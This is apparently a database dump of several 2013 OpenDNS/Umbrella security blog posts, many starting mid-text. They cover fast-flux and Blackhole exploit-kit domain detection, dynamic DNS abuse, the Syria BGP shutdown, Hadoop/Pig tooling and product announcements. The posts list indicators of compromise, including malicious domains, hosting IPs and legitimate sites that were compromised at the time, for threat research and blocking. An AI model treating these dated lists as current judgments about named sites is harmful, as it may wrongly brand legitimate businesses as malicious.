ifikangloo[.]ru, ejjiipprr[.]ru, and dfudont[.]ru, are detected as fastflux and registered in January-April 2013. One of our predictive algorithms detects fastflux domains daily. These domains are often registered recently then start triggering DNS traffic.\nThe domain ehrap[.]net is registered on May 2nd, and stays dormant for 5 days. It starts being DNS-active on May 7 and our fastflux detection system catches it on that day, which is also the same day it begins delivering malware in a fake Amazon spam campaign. On May 8, we catch the domain nilokwe[.]pw as fastflux, which is the same day it is registered. On May 9, we detect the domain pinformer[.]net as fastflux. The three domains ehrap[.]net, nilokwe[.]pw, pinformer[.]net are all Blackhole related domains as urlquery reports it (click on the domain name to see the urlquery report). Furthermore, as of May 8, the three domains ehrap[.]net, nilokwe[.]pw, and pinformer[.]net use the same name server(s): ns1[.]recorderbooks[.]net and ns2[.]recorderbooks[.]net. ns[1-2].recorderbooks[.]net also serve as name servers for nopfrog[.]pw. This domain was registered on May 4, stayed dormant, then started activity as a Blackhole domain on May 9-10 (urlquery report). We spotted it at the same time via its name server association with fastflux Blackhole domains.\njustcollega[.]net is hosted on 37.59.215.18. This IP is hosting several other known malicious domains, and others not yet flagged as malicious. Some of the latter domains were registered in early May, e.g. ksufsdkjvbdskvsdkvsdv[.]com on May 2, justcollega[.]com on May 4, burnbug[.]net on May 5, zohoretail[.]biz on May 5, and contasesso[.]net on May 6. These domains are suspicious and justify that we block them or quarantine them.\nSeveral known Blackhole related domains are hosted on the same IPs, as the figure below shows (from the studied sample). One such IPs is 37.230.116.89. This IP hosts other domains, and similarly several are registered recently. For example, kawsedrol[.]us, kawsedrol[.]info, kawsedrol[.]biz, qertroli[.]us, qertroli[.]info, polkawsed[.]org, polkawsed[.]info are all registered on May 1st 2013. Some of these domains already have known subdomains hosting or redirecting to malware. This justifies that we block the 2LDs.\n\nMore Details on Yara, the Tool for Our Study\nYara is a malware identification and classification tool that is fast at detecting textual patterns in URL samples. One can use known regular expressions of exploit kits’ URLs as rules and fire up the Yara engine to see which URLs match the rules.

Pseudorandom names. Short TTLs. A myriad of IPs spread over unrelated ASNs, most of them being already well known for hosting malicious content. These are strong indicators, among others, that a domain is very likely to be malicious. Our team has been using algorithms that can automatically spot these malicious trends and block them for our customers.\nHowever, the security industry is currently observing a significant paradigm shift. Spammers, scammers and malware authors are now massively abusing compromised machines in order to operate their business. Hours after the Boston Marathon bombing tragedy, a spam campaign drove recipients to a web page containing actual videos of the explosion. What site visitors didn’t know is that the page also contained a malicious iframe exploiting a recent vulnerability in Java that would download and install the Kelihos trojan.\nHere are some of the infectors serving the malicious Java bytecode:\nkentuckyautoexchange.com\ninfoland.xtrastudio.com\naandjlandscapecreations.com\ndetectorspecials.com\nincasi.xtrastudio.com\nsylaw.net\nfranklincotn.us\nearart.com\nbigbendrivertours.com\naeroimageworks.com\nwinerackcellar.com\nIn order to evade most blacklists, the iframe in the video web page was switching to a new URL roughly every hour. Around the same time, other spam campaigns led to a similar page. Thousands of web sites were involved. We quickly set up scripts to monitor these web pages and block newly discovered domains in real time.\nWhat all of these websites have in common is that they were not malicious. These were totally benign web sites, established for a long time, with a decent security track record and no distinctive network features. But in the blink of an eye they were compromised, and started infecting thousands of machines with malware. (Running software known to have well-known vulnerabilities didn’t help.)\nA compromised host is a powerful weapon for malware authors. Having full control of a system makes it easy to serve different content according to the web browser, referrer, time or other criteria. The code can be updated anytime, in order to ship repacked versions or download data from different hosts.\nFurthermore, backdoors like Darkleech can be planted and stay under the radar for a very long time for further malicious activities.\nFor this reason, detecting compromised hosts as soon as possible has become a critical research topic for our team.\nTraffic spikes as an indicator of compromise\nAnomaly detection is a way to spot some domain names we want to take a closer look at. In particular, we are keeping track of domain names seeing a sudden increase of traffic.\n\nThere are many legitimate reasons for such a spike to happen, for example a company may be sending a newsletter.\nWhile being virtually useless as a defense against spam, a lot of mail transfer agents are doing preliminary checks on incoming email.\nWhenever an email whose sender is example.com is received, these servers check that valid DNS MX or A records for example.com are present. They also frequently check that related PTR records map to one of the found IP addresses. TXT queries (for SPF and DomainKey records), as well as checks against DNS-based black lists are also common.\nIn order to reduce false positives when detecting compromised hosts, we only keep domain names for which we saw no TXT, SPF nor MX queries around the time the spike began.\nAnother common cause for a spike of traffic is web sites dedicated to specific events.\nWe use the Umbrella Security Graph to extract three features for domain names observing an abnormal increase of traffic:\n– The popularity score, which reflects the number of distinct client IP addresses having looked up a domain name in a short time frame.\n– The requester geographic distribution. Benign web sites seeing a spike of traffic after a special event tend to fit our models better than malicious domains.\n– The c-rank, which reflects how frequently the domain name has been co-occurring with other domain names known to be malicious.\nThese features then produce and score classification candidate and updates. During this review, we are looking for obfuscated Javascript code, iframes, and software/modules known to have widely exploited vulnerabilities.', 'Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/05/10/why-real-time-detection-of-compromised-hosts-has-become-critical/');

BGP distributes routing information and makes sure all routers on the Internet know how to get to a certain IP address. When an IP range becomes unreachable it will be withdrawn from BGP, this informs routers that the IP range is no longer reachable.\nFor example, one of the name servers for the DNS zone .SY is ns1.tld.sy with IP address 82.137.200.85.\nNormally our routers would expect a BGP route for 82.137.192.0/18\nCurrently that route has disappeared and we no longer have a way to reach the Nameservers for .SY that reside in Syria\nandree@rtr1-re0.ams> show route 82.137.192.0/18 detail\n{master}\nCurrently there are just three routes in the BGP routing tables for Syria, while normally it’s close to Eighty.  Below are the routes that are still being announced by the major Syrian Telecom provider: AS29256\nandree@rtr1-re0.ams> show route aspath-regex “.* 29256 “\n\ninet.0: 447128 destinations, 1696295 routes (446964 active, 5 holddown, 445714 hidden)\n+ = Active Route, – = Last Active, * = Both\n\n46.53.0.0/17       *[BGP/170] 01:41:57, MED 0, localpref 100\nAS path: 3356 3320 29386 29256 I\n\n78.110.96.0/20     *[BGP/170] 01:41:57, MED 0, localpref 100\nAS path: 3356 3320 29386 29256 I\n\n94.141.192.0/19    *[BGP/170] 01:41:57, MED 0, localpref 100\nAS path: 3356 3320 29386 29256 I\nEffectively, the shutdown disconnects Syria from Internet communication with the rest of the world.

The presentations were so engaging, that we wanted to share the insight here with Umbrella Security Labs blog readers.\n\n\n\nWhile Hadoop and the mapreduce framework has served us well in hosting terabytes of data, HBASE type of techniques supporting No-SQL data indexing and query, they are batch-processing in essence. Stream processing frameworks were developed to meet the real-time requirements.\nStreamdrill provides a streaming solution for solving top-k problems. Top-k is always one of the immediate queries in most analytical systems. It answers queries like “top-x tweets”, “top-y spammers” or “top-z DNS abusers”. More importantly, it has to answer them in real-time, from a surprisingly large dataset. Mikio’s drawing below illustrates the streaming logic well.\n(source: http://blog.mikiobraun.de)\nOne of the algorithmic practices Mikio shared is Count-Min Sketch.\n\n\nThe Umbrella Security Lab applies similar techniques in multiple places. In processing the DNS authoritative logs, coming in @ 1G/min (~1.5 Tb/day), we use bloom filters to remove duplicates which reduce the data down to several millions of unique records per day.\nDataFu’s StreamingQuantile algorithm is also used in our security graph system. A simple usage is shown below.

His team’s H2O project is made open source, so math, and statistical learning on bigdata is free. We had a chance to try it out, and after less than 30 minutes of setup, here’s what we see:\n\nPretty neat!

But with our latest feature, Internal Network Identities, customers can now apply policy even to guest wireless, classrooms, computer labs, and server rooms.   Check out the 3 minute video, or read on to see how it works.\n\nThe way it works is simple: drop one of our lightweight virtual appliances into your network, direct your DNS traffic through it, and start mapping your network based on specific internal IP addresses and/or subnets. You can apply policy immediately, or evaluate how those resources are using the network through our reporting functionality and then choose to apply policies that best suit them.\n\nOne of the great things about how the Umbrella cloud-delivered Web security solution works is that you can layer on policies from the outside-in, which ensures a standard policy is applied but exceptions can be made. For example, a customer could create a general, restrictive policy for all distributed offices, based only on redirecting their DNS traffic to the Umbrella service. Next, for that customer’s larger sites, they might drop a Virtual Appliance in and define specific policies for those sites. Then, that customer could create some policies for internal resources within those sites, like  guest wireless or testing labs. Finally, the customer could integrate with Active Directory to provide user-specific policies.\nThe best part is that all of this is managed centrally through a single Web-based console and policy builder that’s easy to use for administrators of all skill levels. The net result is that you can define and manage your distributed network in the way that works best for you.

What’s driving me to rethink the way we approach the problem is both the pace of change and the decreases in efficacy. Security has always been described in the terms of balances. There are the balances of efficacy, productivity, scale, performance, and functionality. And on the research side, there has been this balance of science and art. This post takes a look at that balance and what I am calling the “Security Venn of Research”.\n\n\nThe Security Analyst\nIn the early days of security research, reverse engineers spent their time receiving samples from customers (even sometimes via snail mail on floppy disks). The researcher would then perform some analysis on the code to determine its intent and behavior, and then update the protection system with some sort of signature. This was a hash, CRC, or some sort of byte pattern. Although there was certainly *some* science applied here the majority of this manual work was done by a person that formed their opinion based on their research and was heavily art-based and little science.\n\nBehavior Analysis\nYears later the Internet was invented and malicious, self-replicating code (worms) started to be more pervasive. The volume of malware increased dramatically and the ability to push updates was available over the Internet. In addition, the research community started using  behavior systems. This allowed researchers the luxury of not having to reverse engineer and analyze every sample they collected and automation was put into place to update their protection much more frequently. This overlap created the Security Venn of a small part science and part art.\n\nAutomation : Automation : Automation\nNext came the rise of the cyber-criminal. This made a dramatic impact on the volume and sophistication of attacks. At the same time researchers were building bigger automation systems, creating more collection mechanisms, and building large clusters of systems to automate analysis. Although this balanced the scale of science and art there was still a lot of tuning, development, and manual classification that was being created and maintained based on short-lived problems and driven, primarily from attack samples.\n\n\nBig Data meets Security\n\nAs threats continue to evolve in sophistication and increase in numbers, the reliance on attack samples has caused continued decrease in efficacy. That said, there is a lot of room for continued innovation. We are using technologies from the big data/data mining movement in combination with machine learning and other scientific classification methods based off of DNS data, traffic, and hundreds of features we collect in real-time. This allows for predictive classification with very little human involvement,  post-classification push, and tips the scale towards more science and less art. While reverse-engineering and manual analysis has a role in advanced malware and forensics, it certainly is not equal to scientific research.\n\nDesign will increase in importance\n\nJust like in other technology disciplines, information security can greatly benefit from the data visualization movement in combination with big data. The security version of data viz is sometimes referred to as “Secure-viz” or “sec-viz”. This brings back the art piece of security as the human element may be needed to analyze the data through visualization. The human brain can process graphics in a much more complex way than machines today.\n\nAlthough it may be dependent on the class of attacks you are researching, it’s clear that the research community is moving towards a balance of science, art, and design as the evolution of the security venn.

Seeing how systems can be broken and learning from that drives my interest in IT security to grow.\nOpenDNS: Have you ever been a victim of a scam or malware?\nJared: Early on I had my personal Web server compromised. It was a learning experience, and showed the necessity for multiple layers of defense when building any system.\nOpenDNS: What’s the  most convincing scam that you’ve ever seen?\nJared: The AV industry :p, just kidding. I see so many scams in the run of the day and none are really that convincing if you follow some basic rules. Many are not coherent, have terrible grammar or are completely out of place. I think that the more subtle scams like Twitter/Facebook/Mobile apps that are “grey” at best and siphon off your personal information are probably the most convincing, as even the most aware users often don’t think twice about these types of apps.\nOpenDNS: Besides OpenDNS, what are your favorite tools of the trade to use?\nJared: My absolute favorite tool is Burp Suite from Portswigger, its like the Sriracha of security tools – you can use it on everything. I use it for application security testing and also a proxy for malware communications. Thug is also a pretty cool tool that I have been using lately as it saves me a lot of time.\nOpenDNS: Do u currently have any security certificates like CISSP or GIAC from SANS.\nJared: I currently have two GIAC certifications, GIAC security essentials certification (GSEC) and GIAC Web application pen tester certification (GWAPT). http://www.giac.org/certified-professional/jared-perry/126579\nOpenDNS: What do you most enjoy about being a member of our security community ?\nJared: I enjoy contributing to malware tagging at OpenDNS because it gives data back to the community and helps end users. It’s also a reason for me to develop scripts and learn new tools to tackle malware.\nOpenDNS: Can you demonstrate or explain an interesting case that you moderated?\nJared: Ransomware these days I find interesting, I can only imagine an end user dealing with being locked out of there computer by this malware and some now even have webcam integration to scare the user even further. Its concerning when you find semi-legit services processing payments for these criminal groups. Its more rewarding when you send the data to services like OpenDNS to block these malware networks and report them to payment processors who hopefully freeze the accounts.\nOpenDNS: What’s for lunch?\nJared: Fish and brewis! https://en.wikipedia.org/wiki/Fish_and_brewis\nIf you’re interested in joining Jared and the Umbrella Labs Security Community, just apply online and let us know why you’d make a great contributor to the community.', 'Security Community;Security Research', 'https://umbrella.cisco.com/blog/2013/04/19/meet-jared-a-member-of-the-umbrella-labs-security-community/');

So, you can imagine my excitement when we decided that our first big project after announcing our recent round of Series B funding was to bring six datacenters online – at the same time.\nOur newer sites are strategic locations in key buildings hosting Internet exchanges, which allows us to peer directly with networks that use OpenDNS. Peering is a big factor when we’re deciding where to open a datacenter, as it gives us the ability to connect directly to other organizations. Network latency is very important for our service and this helps brings our service as close to the user as we can get without installing equipment on their network.\nThe new datacenters bring OpenDNS’s services closer to millions of European users, many have already reported increases in speed and performance.

Consider an individual or small business with a dynamic IP who needs to provide consistent content or services publicly advertised to the outside world via a domain name (e.g. website, FTP server, mail server, game room, webcam monitoring, etc). That’s where dynamic DNS helps out. Typically, these customers use the IP assigned to them by their ISP, and every time their IP changes, they notify their dynamic DNS provider to update its name servers so that the customer’s domain points now to the new IP. The notification happens through a client software installed on the customer’s router/computer or via an HTTP restful API. One such client software is DNSOMATIC by OpenDNS.\n\nUnfortunately, the convenience of dynamic DNS did not go unnoticed by miscreants, who have been abusing free, dynamic DNS to perform various attacks such as large-scale malvertising, and targeted spear-phishing, which both resulted in drive-by downloads, and use it for botnet C&C. For attackers, using dynamic DNS constitutes another agile evasion technique against IP blacklisting. It also allows them to deliver malicious payloads from constantly-changing hosting IPs, be it infected individuals’ computers or compromised public websites. To circumvent domain blacklisting, attackers can also use randomly-generated disposable subdomains under the dynamic DNS domain to point to the next hop in a redirection chain or to the final malware hosting IP. This seems similar to fast flux, although from a definition standpoint they are different. For dynamic DNS, the dynamic IP is supposed to fall in the IP range of the ISP (1 or a few ASNs), whereas, with fast flux, a domain will be pointing to an increasing number of different IPs scattered across numerous ASNs and multiple geographical locations. Additionally, for dynamic DNS, the authoritative name servers for a dynamic DNS domain physically belong to the dynamic DNS provider, whereas with fast flux, double fluxing is possible where the name servers can be made point to constantly changing IPs of physical hosts located in disparate ASNs and countries.  In practice, dynamic DNS domains map to a much smaller set of IPs than fast flux.\nIn this blog, we discuss the relationship between dynamic DNS domains and malware as we see it through mining our large DNS data sets. This can also give some perspective on how to address the problem of rogue dynamic DNS domains.\nDynamic DNS analysis\nThere are plenty of dynamic DNS providers, both free and for a cost. One good list of them is available here.\nDynamic DNS providers offer users to either register domains (2LDs), or subdomains (3LDs) under a predefined set of domains (2LDs). For instance, changeIP.com has a list of 155 domains, under which a user can freely register any subdomain of his choice (if it is available). For example, they have 1dumb.com and 2waky.com as pre-registered domains, and a user can register the hostnames johndoe.1dumb.com or myhomebusiness.2waky.com. changeIP also offers to users to register a domain under the following TLDs .com, .net, .info, .org, .biz, or .us. This latter choice requires an annual registration fee though. Similar offers are available from other providers like no-ip.com, afraid.org, Dyn.com (formerly known as DynDNS), etc. The common practice for attackers is to abuse the free subdomains.\nFor this study, we are interested in evaluating the amount of dynamic DNS domains we see in our daily authoritative DNS traffic and the percentage of malicious domains within, and also find out which subdomains are the most frequently abused.\nFirst, we collect a sample of known malicious dynamic DNS domains, then, we compile a list of known pre-registered domains offered by a few dynamic DNS providers. For the malicious sample, the dynamic DNS providers that are mostly used are sitelutions.com, noip.com, changeip.com, and dnsdynamic.org. For the general list, we select known dynamic DNS providers such as: changeip.com, dnsdynamic.org, noip.com, freedns.afraid.org, dyndns.com, sitelutions.com, and 3322.org. These samples are not exhaustive as there are a lot more dynamic DNS providers (and more of them are abused). Some dynamic DNS providers are not limited to offering dynamic DNS services and act also as regular domain registrars, so a domain registered with a dynamic DNS provider and using its name servers might not necessarily be using the dynamic DNS service. We think, however, that these samples are representative enough for the sake of the analysis.\nNext, we resolve the NS (name servers) of all domains in both samples. This list of name servers will be used to filter out the daily logs to identify domains using dynamic DNS. The logic here is that if we already know about a set of dynamic DNS domains, we can identify their name servers, and any new domain that uses these latter name servers will be assumed to be a dynamic DNS domain. The name servers from the general list give a trend on the percentage of total dynamic DNS domains in daily traffic, whereas, the name servers from the malicious sample provide an idea on the dynamic DNS traffic most likely to be malicious. The name servers associated with the sample of malicious dynamic DNS domains are: ns[1-3].changeip.org, ns[1-5].changeip.com, ns[1,2].dnsdynamic.org, nf[1-5].no-ip.com, and ns[1-5].sitelutions.com.\nIn the next step, we collect sample authoritative DNS logs from three resolvers in London, Ashburn and Singapore, where we have for every domain, its associated authoritative name server(s). For each day, we collect a sample of  1,518,782 domains on average with their name servers data. We collect logs for a week, then for each day, we identify those domains whose name servers fall within the list of name servers of dynamic DNS providers.\nFinally, we compare the identified dynamic DNS domains against our blacklist (which is constantly updated with new data), and we show the results in the figures below. For the sake of this discussion, we call sortecielo.2waky.com a hostname, or subdomain or 3LD and 2waky.com a domain or 2LD. We can see in the figures, that there are 30,000+ dynamic DNS hostnames (3LDs) observed daily in the sample authoritative DNS traffic, and 3000+  corresponding domains (2LDs). For the same period, out of the same daily domain sets, we identify 1400+ malicious hostnames, and 200+ associated domains every day. This gives an idea about the density of the associations between a domain and its “children” subdomains.\n\n\nTop abused dynamic DNS domains\nIn the following tables, we show the top 20 domains observed in daily traffic over a week as well as the top 20 domains used for malicious purposes over the same period. The counts next to the domain represent the number of hostnames under that domain. For example, on the first day, disqus had 18,294 hostnames of the form subdomain.disqus.com\n\n\nIn the next table, we show side by side, for a single day the top 20 dynamic DNS domains in general traffic and those that had malicious hostnames. We indicate in red, those domains that are present in both top malicious domains and top popular domains in a daily DNS traffic i.e. no-ip.org, no-ip.biz, no-ip.info, hopto.org, dlinkddns.com, myftp.org, myvnc.com, myftp.biz, and us.to. What is noteworthy is that some popular dynamic DNS domains for general legitimate uses are also the top ones abused for malicious purposes. This makes blocking the entire domain a little tricky as that would deny visibility to a lot of legitimate content. Notice that the dynamic DNS provider no-ip.com is the most used one for both legitimate and malicious intent. The domains no-ip.org, no-ip.biz, no-ip.info, hopto.org, myftp.org, myvnc.com, and myftp.biz all use no-ip name servers. The right hand table for top malicious domains is illustrated at the end of this blog as a graph representation.\n\n\n[top 20 domains in general traffic on the left, and top 20 malicious domains on the right]\nIn the next table, we show the percentage of malicious usage of hostnames under each domain. For example, 56.71% of the 3LDs under hopto.org are malicious. Clearly, some domains are heavily used for malicious purposes.\n\nBelow, we show an illustrative graph of the mapping of hostnames to domains taken from the list of detected malicious dynamic DNS domains of one day. The largest connected component on the top left corner is that of the domain hopto.org which has 245 malicious 3LDs associated with it, e.g. spilak.hopto.org, arasispodmoonf.hopto.org, 1n12.hopto.org, etc. On the right of hopto.org is the cluster of no-ip.org with 125 malicious 3LDs, then no-ip.info on the right with 103 hostnames, etc.\n\nWe further took a sample of hostnames under hopto.org, and we determined that they were used to serve urls for Fragus Exploit kit, Best Pack Exploit kit, Incognito Exploit kit, Java and PDF exploits, leading to Trojan Fake AVs downloads. They were also used as CnC for W32/Dorkbot-EK, Rogue:Win32/Winwebsec, Trojan-Ransom.Win32.Mbro.ysw, IRC botnets, and also to serve phishing urls. In another sample, we observe that malicious dynamic DNS domains are massively associated with Blackhole exploits kit, Neosploit exploits, PDF exploits, and other exploits leading to the delivery of rogue antivirus, trojans, Backdoor SDBot, etc. It is worth mentioning that it is difficult to trace back the registration information of dynamic DNS domains that are in the form of subdomain.[predefined domain].tld because the whois information only records the registration information of the domain (the 2LD).\nNote: The tools and platform I used for this study are our Hadoop dev cluster, Apache Pig, Python, and Unix shell tools (sed, awk, grep, etc).', 'Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/04/15/on-the-trail-of-malicious-dynamic-dns-domains/');

The tool we use most often to write map/reduce jobs is Pig, a high-level language that makes it easy to describe common map/reduce workflows. The tool builds a standalone JAR file out of a script, that eventually runs as a  standard Hadoop job..\n\n\nThe language itself, naturally called Pig Latin, is a succession of simple statements taking an input and producing an output. Inputs and outputs are structured data composed of bags, maps, tuples and scalar data.\nA bag is a collection of tuples, and bags can be nested. This is one of the main things that make Pig very simple yet very powerful.\nColumnar data, as stored in HDFS, usually doesn’t support any kind of nested data, even though Parquet looks extremely promising in this regard.\nThis set of (name, client IP, timestamp) rows can be stored like this on HDFS:\nwww.example.com  172.16.4.2  1365116918\nwww.example.com  10.69.42.21 1365116342\nwww.example.com  10.69.42.21 1365135730\nwww.example.com  10.69.42.21 1365132469\nwww.example.com  192.168.9.6 1365003704\ncuteoverload.com 192.111.0.1 1365176541\ncuteoverload.com 192.111.0.1 1365200469\nBut Pig can map these records to arbitrary schemas that can be a way more natural view of the same data:\n{ (\"www.example.com\",{\n(\"172.16.4.2\",  {1365116918, 1365116342}),\n(\"10.69.42.21\", {1365171304, 1365135730, 1365132469}),\n(\"192.168.9.6\", {1365003704})\n}),\n(\"cuteoverload.com\",{\n(\"192.111.0.1\", {1365176541, 1365200469})\n})\n}\nA bag can be arbitrary large, and can itself contain arbitrary large bags.\nMore importantly, a bag is spillable: its content doesn’t have to fit in memory.\nWhile Pig will do its best in order to keep the content of a bag in memory before processing it, it also includes a sophisticated memory manager that can transparently spill the content to disk if necessary.\nThis is a very important feature for our M/R jobs, where some popular domain names like Google.com can be linked to huge amounts of data.\nNot having to worry about it fitting in memory, and possibly have to rewrite our jobs in a different way just for a handful edge cases is a massive time saver.\nPig’s documentation and tutorials are excellent, so I will just walk through a couple typical operations to show how quickly these can be achieved. These are self-explanatory.\nFiltering\nd1_with_bad_sum = FILTER d1_with_bad_sum BY n > 1;\nAggregation\nd1_with_bad_log_n_max = FOREACH (GROUP d1_with_bad_sum ALL) {\nGENERATE LOG(MAX(d1_with_bad_sum.n)) AS log_n_max;\n};\nJoins\njgs = FOREACH (JOIN d1_with_bad_sum BY name, d1_sum BY name) {\nGENERATE d1_with_bad_sum::name AS name,\n((-100.0 * d1_with_bad_sum::p * LOG(d1_with_bad_sum::n)) /\n(d1_sum::p * d1_with_bad_log_n_max.log_n_max)) AS score;\n};\nSorting\njgs = ORDER jgs BY score ASC, name ASC;\nSecondary sorting\npairs_r = FOREACH (GROUP raw BY client_ip) {\nclient_queries = FOREACH raw GENERATE ts, name;\nclient_queries = ORDER client_queries BY ts, name;\nGENERATE client_queries;\n};\nIn this last example, the content of a bag is sorted by client IP address, and for each client IP address, the list or queries is sorted by timestamp.\nThese statements are lazily evaluated, and transparently converted to sequences of mappers, reducers and combiners.\nWhen the Pig Latin language is not enough\nThe simplicity of the Pig Latin language comes with some apparent limitations.\nOnce Pig has been added to your toolbox, you will probably feel the need for some additional functions, may it be for loading and saving data in an unsupported format, or for applying a specific operation to a collection of data.\nEnter Pig User Defined Functions. Thanks to a very clean API, additional functions can easily be written in virtually any programming language implementation running on the JVM.\nOur language of choice for Pig UDFs is Ruby, or rather JRuby which is a fantastic implementation of the Ruby language for the JVM.\nPig ships with first-class support for JRuby and the exposed API couldn’t be any simpler.\nAs an example, let’s teach Pig a new trick: transforming Labeled Tab-separated Values into data bags of key/value pairs (maps).\nAll we need is declare a new class that inherits PigUdf. All public methods from this class will be immediately visible to Pig, the only requirement being to define the output schema.\nrequire \'pigudf\'\nclass LTSV < PigUdf\noutputSchema \"map[]\"\ndef parse(str)\nHash[str.split(\"t\").map{|f| f.split(\":\", 2)}]\nend\nend\nNow, let\'s use this new function from Pig:\nREGISTER \'ltsv.rb\' USING jruby AS LTSV;\nraw    = LOAD \'access.log\' USING PigStorage(\'n\') AS raw:chararray;\nparsed = FOREACH x GENERATE LTSV.parse(raw) AS m;\nEt voila! JRuby lets us easily extend Pig with new functions that can operate on scalar data as well as ginormous data bags that Pig will automagically spill to disk to keep memory usage below a high watermark.\nNumerous third-party packages for Pig are freely available, our current favorites being LinkedIn\'s DataFu and the GraphChi graph engine\nThings we wish we knew when we started using Pig\nExcited about Pig? Here are a few things that may not stand out when reading the documentation for the first time, but that turn out to be extremely useful.\n- The DESCRIBE and ILLUSTRATE commands are your best friends for debugging a script. The ILLUSTRATE command alone might be a good reason for chosing Pig over something else.\n- pig -x loads and stores files locally instead of a distributed map/reduce job. For small data sets, the job is very likely to start and run orders of magnitude faster. This comes in handy when developing a new script.\n- Besides a command-line tool, Pig is a Java package. Scripts can be executed from any language implementation running on the JVM. This is especially useful for iterative processes.\n- Nested FOREACH statements are very powerful.\n- Compress map output and temporary files:\nSET mapred.compress.map.output true;\nSET mapred.map.output.compression.codec org.apache.hadoop.io.compress.SnappyCodec;\nSET pig.tmpfilecompression true;\nSET pig.tmpfilecompression.codec lzo;\n- The content of the ~/.pigbootup file is read and executed at startup time. This is a good place to store default settings.\n- Talking about settings, these will make your eyes bleed a bit less:\nSET pig.pretty.print.schema true;\nSET verbose false;\n- Read the FAQ. Twice. Pay attention to the different JOIN strategies. Using the correct one can make a job run way faster.\n- New features introduced in recent versions are disabled by default for a reason. They can provide significant speedups, but also lead to obscure bugs that will eventually drive you crazy. You\'ve been warned.\n- Real pigs can\'t fly.\nPig is only one of the numerous tools we use daily in order to slice and dice data.\nWhile we are still occasionnally using Java and Rubydoop, the Pig+JRuby combo currently remains for us the most efficient way to quickly develop and test new algorithms, such as the ones we are using to discover thousands of suspicious domains every day.\nAnd if you are as excited about Pig as we are, don’t forget that we are always hiring!', 'Open Source;Security Research', 'https://umbrella.cisco.com/blog/2013/04/08/pig-jruby/');

For example, while a K-12 school district might choose Umbrella as a stand-alone solution for Web filtering and malware protection, large enterprises often deploy Umbrella as part of a deeply-layered security strategy. One of the conversations we frequently have with prospective customers is around how Umbrella fits into these defense-in-depth strategies. That’s why we’re so excited to share the story of how FLEXcon, a leading manufacturing company, is using Umbrella today.\n\nThe company, which places heightened focus and importance on its security strategy, had built an extremely fortified network architecture that included unified threat management (UTM) devices, dedicated firewalls and desktop antivirus. However, FLEXcon still had no way of completely preventing malware before it penetrated its network. As a result, the team was still seeing an average of three malware infections each week. While that number may seem trivial, the average end-user downtime per infection was approximately eight hours, and PC techs were continually dragged away from proactive IT projects.\nThat’s when Chris Marinin, IT Security Analyst at FLEXcon, reached out to other IT professionals he trusted. He received several recommendations that he try out Umbrella, OpenDNS’s line of Internet security services for businesses. Chris told us, “Our layered network security environment is set up so the day-to-day overhead is minimal. We needed to find a way to seal our network with a very low-maintenance solution. Everyone I talked to told me Umbrella by OpenDNS would make the perfect addition to the layered security architecture I was building.”\nFLEXcon chose to deploy Umbrella Enterprise because the solution proactively prevents malware before it can enter the network environment. Umbrella blocks malware in two ways: users are prevented from clicking on known malicious links so they can’t download malware, and infected devices are prevented from phoning home to botnet command and control, so botnets are unable to launch malicious tasks. Unlike many Secure Web Gateway appliances that only provide security for HTTP/S traffic, Umbrella uniquely blocks malicious traffic that travels over any port, protocol or application. On average, OpenDNS is now blocking 80,000,000 malware, botnet and phishing-related requests each day.\nChris told us, “We looked at alternative UTM devices, but we really needed something that could stop the threat before it had a chance to enter our network. Umbrella Enterprise has a reputation in the IT community for doing exactly that.” Chris and the FLEXcon team got started on Umbrella through a frictionless free trial, and as Chris explains, “It was crystal clear during our free trial that Umbrella Enterprise works as promised.”\nIf you’d like to take Umbrella for a spin and see firsthand how the service prevented 6,000 requests for malicious domains, 300 requests for botnet communications and 1,000 requests for proxy/anonymizer sites for FLEXcon in the first month alone, let us know by signing up for a free trial today.', 'Announcements;Field Reports;Umbrella', 'https://umbrella.cisco.com/blog/2013/04/05/field-reports-how-flexcon-reduced-malware-by-98-with-umbrella-by-opendns/');

And, people are starting to talk about the powerful security we provide our customers by harnessing the collective wisdom of our vantage point on the Internet. But there’s a third tranche of OpenDNS that makes us different from the traditional enterprise security guys and it’s just as important as the first two.\nIn a world where security needs to be delivered 24×7, the approach we take to preserving privacy and providing transparency is of paramount importance.\n\nThe reason delivering security as a service is so transformative is that it’s the only way to adequately protect people when they are outside the office. The appliance model doesn’t work in a world where people take their laptops home, get infected, and bring the infection back to the office. And it’s useless when we’re talking about mobile devices accessing cloud applications, neither of which ever touch the corporate network. To be effective, security needs to be enabled anytime you do anything on the Internet, not just when you’re in the office.\nBut a world of 24×7 security has our customers and us asking a lot of important questions. In order for IT to effectively deliver the message that security has to happen whenever and wherever users work in order to be secure, they also need to be empowered to have discussions around transparency and privacy. Employees also want to know how they are being monitored, especially outside the office and on their own devices. And frankly, we couldn’t agree more and we put this into practice in our service.\nLogging is an ideal example of this. While we always want users to be protected from threats, maybe logging what websites someone visits only needs to happen when the employee is physically in the office, where the organization needs to be conscious of liability concerns. What employees do at home may be their own business, and many of our customers tell us is the case. Heck, they don’t even want to know, but they still want them to be protected. So, we now offer Umbrella customers the ability to selectively determine what information is logged based on the device, group, location, policy, and a growing number of other contexts.\n\nWhen our customers ask us: “Can I block malware all the time, but only log inappropriate websites when the user is in the office, and do all of this regardless of what device the person is using?” We’re proud to say that the answer is now a resounding yes.\nAnd in addition to offering these features, we also think it’s important for the users themselves to be aware of when their traffic is being logged or not. As such, we’ve also added features to our roaming laptop client to display very clearly to users what policies are being applied regarding logging (and eventually we’ll allow IT admins to share more details on what policies are being enforced). Transparency can serve to build trust between IT admins and their users and turn security into a partnership, rather than a battle.\nWe have much more to say on the topics of privacy and transparency, much of which is being implemented in code in our products. Everyone wants to be secure, and we live in a world where people use devices for work and personal use, and we want to create the conduits to help people do that in a way that is safe, secure and transparent.\nFor more details on selective logging, watch the 3 minute video our product team created to show you how it works.', 'Announcements;Umbrella', 'https://umbrella.cisco.com/blog/2013/04/04/preserving-privacy-and-providing-transparency-in-a-world-of-always-on-security/');

